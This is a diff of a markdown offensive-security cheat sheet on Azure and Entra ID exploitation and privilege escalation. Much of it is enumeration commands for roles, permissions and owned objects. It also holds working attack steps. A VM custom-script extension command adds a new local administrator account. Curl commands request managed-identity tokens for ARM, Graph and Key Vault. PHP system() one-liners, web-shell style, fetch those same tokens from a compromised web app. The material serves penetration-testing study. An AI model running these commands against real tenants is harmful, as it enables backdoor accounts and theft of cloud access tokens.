@@ -1,9 +1,10 @@
 # Exploitation & Privilege escalation
 * [General](#General)
-  * [Requesting access tokens](#Requesting-access-tokens)
 * [Exploitation Enumeration](#Exploitation-Enumeration)
+  * [When new Identity](#When-new-identity)
+    * [Entra ID](#Entra-ID)
+    * [Azure](#Azure)
   * [When on a new machine](#When-on-a-new-machine)
-  * [After getting a new user](#After-getting-a-new-user)
 * [Azure AD](#Azure-AD-Exploitation)
   * [Managed Identity](#Managed-Identity)
   * [Abusing dynamic groups](#Abusing-dynamic-groups)
@@ -38,7 +39,158 @@
   * [Updateable groups](#Updateable-groups)
 
 ## General
+
 ## Exploitation Enumeration
+- When a new identity has been received, either login or access tokens check Entra ID and Azure privileges!
+
+### When new identity
+### Entra ID
+### User
+#### List objects created by specific user
+```
+Get-MgUserCreatedObject -UserId <UPN USER>
+```
+
+#### List objects created by user loop
+```
+Get-MgUser -All | ForEach-Object {$Name = $_.UserPrincipalName; Write-Host "Checking created objects for $Name"; Get-MgUserCreatedObject -UserId $_.UserPrincipalName | select Id, @{Name='displayName';Expression={$_.AdditionalProperties.displayName}},@{Name='ObjectType';Expression={$_.AdditionalProperties.'@odata.type'}}; Write-Host " "}
+```
+
+#### Check group memberships of user
+```
+(Get-MgUser -UserId <USER UPN> -ExpandProperty MemberOf).MemberOf | ForEach-Object {Get-MgDirectoryObject -DirectoryObjectId $_.Id | select Id, @{Name='displayName';Expression={$_.AdditionalProperties.displayName}},@{Name='ObjectType';Expression={$_.AdditionalProperties.'@odata.type'}}}
+```
+
+#### Check Entra role assignments for specific object loop
+```
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<OBJECT ID>'" | ForEach-Object {
+	$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+	[PSCustomObject]@{
+		RoleDisplayName = $roleDef.DisplayName
+		RoleId = $roleDef.Id
+		DirectoryScopeId = $_.DirectoryScopeId
+	}
+} | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
+```
+
+### Enterprise Apps
+#### Check Enterprise app info
+```
+Get-MgServicePrincipal -Filter "DisplayName eq '<NAME>'" | fl
+
+Get-MgServicePrincipal -Filter "Id eq '<OBJECT ID>'" | fl
+```
+
+#### Check role assignments
+- Check the ResourceDisplayName (Example Microsoft Graph)
+
+```
+$ObjectId = ""
+
+$AppRoleAssignment = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $ObjectId 
+
+$AppRoleAssignment | fl
+```
+
+- Resolve AppRoleID permission
+	- Check well known app ids [here](https://learn.microsoft.com/en-us/troubleshoot/azure/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications)
+	- Example uses well known appId of microsoft graph
+
+```
+(Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles | ? {$_.id -eq <AppRoleId> } | fl
+```
+
+#### Check Entra role assignments
+```
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<OBJECT ID>'" | ForEach-Object {
+	$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+	[PSCustomObject]@{
+		RoleDisplayName = $roleDef.DisplayName
+		RoleId = $roleDef.Id
+		DirectoryScopeId = $_.DirectoryScopeId
+	}
+} | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
+```
+
+#### List owned objects
+```
+Get-MgServicePrincipalOwnedObject -ServicePrincipalId <ID> | select Id, @{Name='displayName';Expression={$_.AdditionalProperties.displayName}},@{Name='ObjectTyoe';Expression={$_.AdditionalProperties.'@odata.type'}} | fl
+```
+
+## Azure
+#### List available resources
+```
+Get-AzResource
+```
+
+#### List roles
+```
+Get-AzRoleAssignment
+```
+
+#### Get role definition
+```
+Get-AzRoleDefinition -Id <ROLEDEFINITION ID>
+
+Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
+```
+
+#### Check permission in resource
+```
+Get-AzRoleAssignment -Scope <RESOURCE ID>
+```
+
+#### List permissions on specific resource Graph API
+```
+$Name = "<RESOURCE NAME>"
+$ARMAccessToken = "<TOKEN>"
+
+$Resource = Get-AzResource -Name $Name
+$SubscriptionID = (Get-AzSubscription).Id
+$ResourceGroupName = $Resource.ResourceGroupName
+$ResourceName = $Resource.Name
+$ResourceProviderNamespace = $Resource.ResourceType
+
+$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourcegroups/$ResourceGroupName/providers/$ResourceProviderNamespace/$ResourceName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+$RequestParams = @{
+	Method = 'GET'
+	Uri = $URI
+	Headers = @{
+		'Authorization' = "Bearer $ARMAccessToken"
+	}
+}
+$Permissions = (Invoke-RestMethod @RequestParams).value
+
+$Permissions | fl *
+```
+
+- Loop through all resources using Object ID
+```
+$ARMAccessToken = "<TOKEN>"
+
+$Resources = Get-AzResource
+
+foreach($Resource in $Resources)
+{
+	$ID = $Resource.Id
+	$URI = "https://management.azure.com/$ID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+	$RequestParams = @{
+		Method = 'GET'
+		Uri = $URI
+		Headers = @{
+			'Authorization' = "Bearer $ARMAccessToken"
+		}
+		ContentType = "application/json"
+}
+
+$Result = Invoke-RestMethod @RequestParams
+$ResourceName = $Resource.Name
+
+Write-Output "ResourceName - $ResourceName"
+Write-Output "Permissions -" $Result.value | fl *
+}
+```
+
 ### When on a new machine
 ### Get machine info
 ```
@@ -92,17 +244,9 @@ Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
 ```
 
 #### Set VM Extensions
+- Required permissions `Microsoft.Compute/virtualMachines/extensions/write` and `Microsoft.Compute/virtualMachines/extensions/read`
 ```
-#Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"
-
 Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
-```
-
-#### Get access token
-Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
-```
-az account get-access-token
-az account get-access-token --resource-type ms-graph 
 ```
 
 #### Check if server has a managed identity
@@ -111,70 +255,62 @@ az account get-access-token --resource-type ms-graph
 env
 ```
 
-### After getting a new user / managed identity
-#### Check for other tenants
-- Login to the Azure portal and in the right top click on the user and then `Switch Directory`.
+
+#### Get access token
+Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
 ```
-Get-AzTenant
+az account get-access-token
+az account get-access-token --resource-type ms-graph 
 ```
 
-#### List all accessible resources
-- Or login in https://portal.azure.com and click all resources
+#### Curl
+- ARM
 ```
-Get-AzResource
-
-az resource list
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
-#### List all owned objects
+- Azure AD Graph
 ```
-az ad signed-in-user list-owned-objects
-
-Get-AzureADUserOwnedObject -ObjectId <ID>
+curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
-#### Check permissions on the resource
+- Microsoft Graph
 ```
-Get-AzRoleAssignment -Scope <RESOURCE ID>
-
-az role assignment list
+curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
-##### Get current Azure role assignments
+- Keyvault
 ```
-Get-AzRoleAssignment
-```
-
-#### Get Entra ID role assignments for objectID
-```
-Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<OBJECT ID>'" | ForEach-Object {
-	$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
-	[PSCustomObject]@{
-		RoleDisplayName = $roleDef.DisplayName
-		RoleId = $roleDef.Id
-		DirectoryScopeId = $_.DirectoryScopeId
-	}
-} | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
-#### Check API permissions / App Role Assignments for OBJECT ID
+### PHP
+- ARM
 ```
-Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <OBJECT ID>
-```
-
-#### Get the role definition
-```
-Get-AzRoleDefinition -Id <ROLEDEFINITION ID>
+<?php
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?>
 ```
 
-#### Check if it can read any deployment
+- Azure AD Graph
 ```
-Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
+<?php
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?>
 ```
 
-#### Get the allowed actions on the role definition
+- Microsoft Graph
 ```
-Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
+<?php
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?>
+```
+
+- Keyvault
+```
+<?php
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?>
 ```
 
 ## Azure AD Exploitation
